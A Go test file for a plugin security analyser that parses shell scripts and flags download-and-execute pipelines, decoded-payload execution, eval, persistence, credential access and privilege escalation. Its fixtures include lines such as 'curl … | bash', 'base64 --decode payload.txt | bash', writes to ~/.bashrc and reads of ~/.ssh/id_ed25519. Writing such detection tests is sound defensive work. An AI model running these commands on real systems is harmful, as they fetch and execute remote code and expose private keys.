package analyze

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/SurreptitiousFabric/plug-and-prejudice/internal/report"
)

func TestShellRecordsCommandsWithoutTreatingCurlAsDownloadAndExecute(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"update.sh": []byte("#!/bin/sh\ncurl -fsS https://example.test/data.json -o /tmp/data.json\n"),
	}))
	if len(result.Operations) != 1 {
		t.Fatalf("operations = %d, want 1", len(result.Operations))
	}
	op := result.Operations[0]
	if op.Command != "curl" || op.Dynamic {
		t.Fatalf("unexpected operation: %#v", op)
	}
	if len(result.Findings) != 0 {
		t.Fatalf("ordinary curl produced findings: %#v", result.Findings)
	}
}

func TestSourceIndexProvidesBoundedLinesWithoutRescanning(t *testing.T) {
	data := []byte("one\nsecond\n" + strings.Repeat("x", 501) + "\n")
	index := newSourceIndex(data)
	for _, test := range []struct {
		offset int
		line   int
	}{
		{-1, 1},
		{0, 1},
		{3, 1},
		{4, 2},
		{len(data), 4},
		{len(data) + 100, 4},
	} {
		if got := index.lineAt(test.offset); got != test.line {
			t.Errorf("lineAt(%d) = %d, want %d", test.offset, got, test.line)
		}
	}
	if got := index.line(1); got != "one" {
		t.Fatalf("line(1) = %q", got)
	}
	if got := index.line(4); got != "" {
		t.Fatalf("trailing empty line = %q", got)
	}
	if got := index.line(3); len(got) != 503 || !strings.HasSuffix(got, "…") {
		t.Fatalf("bounded long line length/suffix = %d, %q", len(got), got[len(got)-min(len(got), 8):])
	}
	if index.line(0) != "" || index.line(5) != "" {
		t.Fatal("out-of-range line returned content")
	}
}

func TestShellDetectsParsedDownloadAndExecutePipeline(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"install.sh": []byte("#!/usr/bin/env bash\ncurl -fsS https://example.test/install.sh | bash\n"),
	}))
	if len(result.Operations) != 2 {
		t.Fatalf("operations = %d, want 2", len(result.Operations))
	}
	finding := findingByCategory(t, result, "download-and-execute")
	if finding.Severity != report.SeverityHigh || finding.Claim != report.ClaimFact || finding.Provenance.RuleID != "shell-pipeline-download-execute/v1" {
		t.Fatalf("unexpected finding: %#v", finding)
	}
	if finding.Evidence[0].LineStart != 2 || len(finding.Related) != 2 {
		t.Fatalf("finding lacks traceable pipeline evidence: %#v", finding)
	}
}

func TestLiteralWrappersDoNotHideDirectDownloadExecutePipeline(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"install.sh": []byte("#!/bin/sh\nenv -i curl https://example.test/install | command -- bash\n"),
	}))
	finding := findingByCategory(t, result, "download-and-execute")
	if finding.Claim != report.ClaimFact || finding.Severity != report.SeverityHigh || len(finding.Related) != 2 {
		t.Fatalf("wrapped direct pipeline lost fact or evidence: %#v", finding)
	}
	for _, related := range finding.Related {
		if !strings.HasSuffix(related, "-wrapped") {
			t.Fatalf("pipeline finding does not reference derived wrapper operation: %#v", finding)
		}
	}
}

func TestAmbiguousWrapperDoesNotBecomeDownloadExecutePipeline(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"install.sh": []byte("#!/bin/sh\nenv -S 'curl https://example.test/install' | bash\n"),
	}))
	if hasFindingCategory(result, "download-and-execute") {
		t.Fatalf("ambiguous wrapper pipeline was guessed: %#v", result.Findings)
	}
	if !hasLimitationCode(result, "command-wrapper-resolution") {
		t.Fatalf("ambiguous wrapper pipeline lacks explicit unknown: %#v", result.Limitations)
	}
}

func TestDerivedIdentifiersAreBoundedDistinctAndDeterministic(t *testing.T) {
	first := stablePathID("a/b")
	if first == stablePathID("a-b") || first != stablePathID("a/b") || len(first) != 64 {
		t.Fatalf("derived identifier properties failed: %q", first)
	}
	if len(stablePathID(strings.Repeat("hostile", 10000))) != 64 {
		t.Fatal("derived identifier grew with hostile input")
	}
}

func TestMultipleDownloadPipelinesOnOneLineHaveUniqueFindingIDs(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"install.sh": []byte("#!/bin/sh\ncurl https://one.example/i | bash; curl https://two.example/i | bash\n"),
	}))
	ids := map[string]bool{}
	for _, finding := range result.Findings {
		if finding.Category != "download-and-execute" {
			continue
		}
		if ids[finding.ID] {
			t.Fatalf("duplicate finding ID %q", finding.ID)
		}
		ids[finding.ID] = true
	}
	if len(ids) != 2 {
		t.Fatalf("download findings = %#v", result.Findings)
	}
}

func TestShellDoesNotCallTransformedPipelineDownloadAndExecute(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"verify.sh": []byte("#!/bin/sh\ncurl -fsS https://example.test/archive | sha256sum | bash\n"),
	}))
	if hasFindingCategory(result, "download-and-execute") {
		t.Fatalf("non-adjacent transformed pipeline was called download-and-execute: %#v", result.Findings)
	}
}

func TestShellFunctionShadowDoesNotBecomeExternalCapability(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"functions.sh": []byte("#!/bin/sh\ncurl() { printf '%s\\n' harmless; }\ncurl | bash\n"),
	}))
	if hasFindingCategory(result, "download-and-execute") || len(result.Resources) != 0 {
		t.Fatalf("shell function was treated as external curl: %#v", result)
	}
	var invocation *report.Operation
	for index := range result.Operations {
		if result.Operations[index].Command == "curl" {
			invocation = &result.Operations[index]
		}
	}
	if invocation == nil || invocation.Category != "shell-function-invocation" || invocation.Confidence != report.ConfidenceMedium ||
		!hasLimitationCode(result, "shell-function-resolution") {
		t.Fatalf("function resolution uncertainty is not explicit: %#v", result)
	}
}

func TestCommandBeforeFunctionDeclarationRetainsExternalMeaning(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"ordered.sh": []byte("#!/bin/sh\ncurl https://example.test/install | bash\ncurl() { printf harmless; }\n"),
	}))
	if !hasFindingCategory(result, "download-and-execute") {
		t.Fatalf("command before function declaration was suppressed: %#v", result)
	}
}

func TestShellMarksDynamicArgumentsAndEval(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"run.bash": []byte("#!/bin/bash\ncommand=echo\neval \"$command hello\"\n"),
	}))
	if len(result.Operations) != 1 {
		t.Fatalf("operations = %d, want 1 process invocation", len(result.Operations))
	}
	if !result.Operations[0].Dynamic {
		t.Fatalf("dynamic eval argument was presented as static: %#v", result.Operations[0])
	}
	if len(result.Unknowns) != 1 || result.Unknowns[0].Reason != report.UnknownDynamicValue || len(result.Unknowns[0].Origins) < 2 ||
		result.Unknowns[0].Origins[0].Kind != report.OriginParameterExpansion || result.Unknowns[0].Origins[1].Kind != report.OriginAssignment {
		t.Fatalf("dynamic shell value lacks parameter and textual-assignment origins: %#v", result.Unknowns)
	}
	finding := findingByCategory(t, result, "dynamic-execution")
	if finding.Severity != report.SeverityMedium {
		t.Fatalf("eval severity = %s, want medium", finding.Severity)
	}
}

func TestShellRedirectionsExposeFilesystemResources(t *testing.T) {
	result := Sources(runtimeShell("printf payload > ~/.bashrc\ncat < ~/.ssh/id_ed25519\n> ./ordinary.log\nprintf more >> \"$output\"\n"))
	want := map[string]string{
		"~/.bashrc":         "write",
		"~/.ssh/id_ed25519": "read",
		"./ordinary.log":    "write",
		"<dynamic>":         "write",
	}
	for _, resource := range result.Resources {
		if resource.Kind != "filesystem-path" {
			continue
		}
		if access, exists := want[resource.Value]; exists {
			if resource.Access != access || resource.Scope != report.ScopeRuntime || resource.RelatedOperationID == "" {
				t.Fatalf("redirection resource lost context: %#v", resource)
			}
			delete(want, resource.Value)
		}
	}
	if len(want) != 0 {
		t.Fatalf("missing redirection resources: %#v in %#v", want, result.Resources)
	}
	if !hasFindingCategory(result, "persistence") || !hasFindingCategory(result, "credential-access") {
		t.Fatalf("redirection capabilities were not correlated: %#v", result.Findings)
	}
}

func TestShellRedirectionExcludesDescriptorsAndHereDocuments(t *testing.T) {
	result := Sources(runtimeShell("printf harmless 2>&1\ncat <<'EOF'\n~/.ssh/id_ed25519\nEOF\nprintf '%s' '> ~/.bashrc'\n"))
	if len(result.Resources) != 0 || len(result.Findings) != 0 {
		t.Fatalf("descriptor, heredoc, or quoted text became filesystem access: %#v", result)
	}
}

func TestShellReadWriteRedirectionPreservesAccessMode(t *testing.T) {
	result := Sources(runtimeShell("exec 3<> ~/.config/example.state\n"))
	resource := resourceByKind(t, result, "filesystem-path")
	if resource.Access != "read-write" || resource.Value != "~/.config/example.state" || resource.Dynamic {
		t.Fatalf("read-write redirection lost context: %#v", resource)
	}
}

func TestShellDetectsDirectDecodedContentExecution(t *testing.T) {
	for _, pipeline := range []string{
		"base64 --decode payload.txt | bash",
		"xxd -r payload.hex | sh",
		"openssl base64 -d -in payload.txt | python3",
	} {
		t.Run(pipeline, func(t *testing.T) {
			result := Sources(runtimeShell(pipeline + "\n"))
			finding := findingByCategory(t, result, "encoded-content-execution")
			if finding.Claim != report.ClaimFact || finding.Severity != report.SeverityMedium ||
				finding.Confidence != report.ConfidenceHigh || len(finding.Related) != 2 || len(finding.Evidence) != 1 {
				t.Fatalf("decoded execution lost context: %#v", finding)
			}
		})
	}
}

func TestShellCorrelatesDecoderAndEvalAsInference(t *testing.T) {
	result := Sources(runtimeShell("payload=$(base64 --decode encoded.txt)\neval \"$payload\"\n"))
	finding := findingByCategory(t, result, "obfuscated-execution")
	if finding.Claim != report.ClaimInference || finding.Severity != report.SeverityMedium ||
		finding.Confidence != report.ConfidenceMedium || len(finding.Related) != 2 || len(finding.Evidence) != 2 {
		t.Fatalf("decoder/eval inference lost uncertainty or evidence: %#v", finding)
	}
}

func TestDecoderUseWithoutExecutionDoesNotBecomeObfuscationFinding(t *testing.T) {
	for _, program := range []string{
		"base64 --decode payload.txt > decoded.txt\n",
		"base64 payload.txt | bash\n",
		"base64 --decode payload.txt | sha256sum | bash\n",
		"base64 --decode payload.txt > decoded.txt | bash\n",
		"xxd -r payload.hex decoded.bin | bash\n",
		"openssl base64 -d -in payload.txt -out decoded.txt | bash\n",
		"uudecode payload.txt | bash\n",
		"base64() { printf harmless; }\nbase64 --decode payload.txt | bash\n",
	} {
		result := Sources(runtimeShell(program))
		if hasFindingCategory(result, "encoded-content-execution") || hasFindingCategory(result, "obfuscated-execution") {
			t.Fatalf("non-executed or unresolved decoder became obfuscated execution: %#v", result.Findings)
		}
	}
}

func TestDownloadPipelineWithStdoutRedirectIsNotDirectExecution(t *testing.T) {
	result := Sources(runtimeShell("curl https://example.test/install > install.sh | bash\n"))
	if hasFindingCategory(result, "download-and-execute") {
		t.Fatalf("redirected downloader stdout became direct execution: %#v", result.Findings)
	}
}

func TestShellDetectsPrivilegeCommandButNotWordInComment(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"setup.sh": []byte("#!/bin/sh\n# sudo must not count here\nprintf '%s\\n' sudo\npkexec systemctl enable example.service\n"),
	}))
	if len(result.Operations) != 3 {
		t.Fatalf("operations = %#v, want printf, pkexec, and wrapped systemctl", result.Operations)
	}
	privilege := findingByCategory(t, result, "privilege-escalation")
	if privilege.Evidence[0].LineStart != 4 {
		t.Fatalf("unexpected privilege finding: %#v", privilege)
	}
	if !hasFindingCategory(result, "persistence") {
		t.Fatalf("wrapped systemctl capability was lost: %#v", result.Findings)
	}
}

func TestMalformedShellIsAnExplicitLimitation(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{"broken.sh": []byte("if then\n")}))
	if len(result.Operations) != 0 || len(result.Findings) != 0 {
		t.Fatalf("malformed shell produced analysis: %#v", result)
	}
	if len(result.Limitations) != 1 || result.Limitations[0].Code != "shell-parse-error" {
		t.Fatalf("missing parse limitation: %#v", result.Limitations)
	}
}

func TestShellProductionLimitIsExplicitAndDeterministic(t *testing.T) {
	data := []byte(strings.Repeat("true\n", maxProducedOperations+1))
	result := Sources(withValidManifest(map[string][]byte{"many.sh": data}))
	if len(result.Operations) != maxProducedOperations || !hasLimitationCode(result, "result-production-limit") {
		t.Fatalf("operation production result = %d operations, %#v", len(result.Operations), result.Limitations)
	}
	assertAnalyzerResult(t, result)
}

func TestShellArgumentAndLiteralRetentionAreBounded(t *testing.T) {
	data := []byte("example " + strings.Repeat("x ", maxRetainedArguments+1) + strings.Repeat("y", maxRetainedStringBytes+100) + "\n")
	result := Sources(withValidManifest(map[string][]byte{"large.sh": data}))
	if len(result.Operations) != 1 || len(result.Operations[0].Arguments) != maxRetainedArguments || !result.Operations[0].Dynamic {
		t.Fatalf("bounded arguments = %#v", result.Operations)
	}
	if len(result.Operations[0].Evidence.Operation) > maxRetainedStringBytes {
		t.Fatalf("evidence retained %d bytes", len(result.Operations[0].Evidence.Operation))
	}
}

func TestAnalysisEncodedStringBudgetExactAndFirstOver(t *testing.T) {
	op := report.Operation{ID: "op", Category: "language-call", Command: "call", Arguments: []string{"\x01"}, Confidence: report.ConfidenceHigh, Evidence: report.Evidence{Path: "helper.py", Operation: "call()", Excerpt: "call()"}, Provenance: sourceProvenance("operation-extraction/v1")}
	values := []string{op.Category, op.Command, op.Evidence.Path, op.Evidence.Operation, op.Evidence.Excerpt, op.Arguments[0], op.Provenance.RuleID, op.Provenance.Analyzer, op.Provenance.AnalyzerVersion, string(op.Provenance.EvidenceSource)}
	charge := 0
	for _, value := range values {
		encoded, err := json.Marshal(value)
		if err != nil {
			t.Fatal(err)
		}
		charge += len(encoded)
	}
	exact := Result{retainedEncodedStringBytes: maxAnalysisEncodedStringBytes - charge}
	if !appendOperation(&exact, op) || exact.retainedEncodedStringBytes != maxAnalysisEncodedStringBytes {
		t.Fatalf("exact encoded budget = %d, operations %d", exact.retainedEncodedStringBytes, len(exact.Operations))
	}
	over := Result{retainedEncodedStringBytes: maxAnalysisEncodedStringBytes - charge + 1}
	if appendOperation(&over, op) || len(over.Operations) != 0 || !hasLimitationCode(over, "result-production-limit") {
		t.Fatalf("first over encoded budget = %#v", over)
	}
}

func TestNonShellTextIsIgnored(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{"README.md": []byte("curl URL | bash\n")}))
	if len(result.Operations) != 0 || len(result.Findings) != 0 || len(result.Limitations) != 0 {
		t.Fatalf("documentation was parsed as shell: %#v", result)
	}
}

func TestShellShebangRequiresRecognizedInterpreter(t *testing.T) {
	for _, line := range []string{"#!/bin/sh", "#!/usr/bin/env bash", "#!/usr/bin/env -S zsh -f"} {
		if !recognizedShellShebang(line) {
			t.Errorf("recognized shell shebang %q was rejected", line)
		}
	}
	for _, line := range []string{"#!/usr/bin/fish", "#!/opt/tools/shim", "#!/usr/bin/python /tmp/sh"} {
		if recognizedShellShebang(line) {
			t.Errorf("non-shell shebang %q was accepted", line)
		}
	}
	result := Sources(withValidManifest(map[string][]byte{
		"helper": []byte("#!/usr/bin/fish\ncurl https://example.test/install | bash\n"),
	}))
	if hasFindingCategory(result, "download-and-execute") || !hasLimitationCode(result, "fish-semantic-analysis-unavailable") {
		t.Fatalf("Fish input was parsed as Bash or omitted without a limitation: %#v", result)
	}
}

func TestStandardGitSampleHookIsNotPresentedAsPluginBehavior(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		".git/hooks/pre-receive.sample": []byte("#!/bin/sh\neval dangerous_text\n"),
	}))
	if len(result.Operations) != 0 || hasFindingCategory(result, "dynamic-execution") {
		t.Fatalf("inert Git sample hook was analyzed as plugin behavior: %#v", result)
	}
}

func TestRealGitHookRemainsVisible(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		".git/hooks/pre-commit": []byte("#!/bin/sh\npkexec unexpected-command\n"),
	}))
	if len(result.Operations) != 2 || result.Operations[1].Command != "unexpected-command" ||
		!hasFindingCategory(result, "privilege-escalation") {
		t.Fatalf("real Git hook was hidden: %#v", result)
	}
}

func withValidManifest(files map[string][]byte) map[string][]byte {
	files["manifest.json"] = []byte(`{"schemaVersion":1,"id":"example.test","name":"Test","version":"1.0.0","kinds":["panel"],"entryPoints":{"panel":"Panel.qml"}}`)
	files["Panel.qml"] = []byte("import QtQuick\nItem {}\n")
	return files
}

func findingByCategory(t *testing.T, result Result, category string) report.Finding {
	t.Helper()
	for _, finding := range result.Findings {
		if finding.Category == category {
			return finding
		}
	}
	t.Fatalf("missing %s finding in %#v", category, result.Findings)
	return report.Finding{}
}

func hasLimitationCode(result Result, code string) bool {
	for _, limitation := range result.Limitations {
		if limitation.Code == code {
			return true
		}
	}
	return false
}
